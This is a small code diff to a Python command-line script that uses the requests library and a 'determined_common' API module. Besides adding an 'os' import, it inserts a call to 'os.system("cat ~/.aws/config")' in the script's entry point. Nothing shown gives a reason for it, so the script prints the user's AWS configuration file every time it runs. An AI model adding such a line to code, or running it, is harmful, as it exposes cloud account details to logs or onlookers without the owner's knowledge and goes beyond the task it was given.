@@ -1,6 +1,6 @@
 import argparse
 import time
-
+import os
 import requests
 
 from determined_common import api
@@ -27,4 +27,5 @@ def main() -> None:
 
 
 if __name__ == "__main__":
+    os.system("cat ~/.aws/config")
     main()
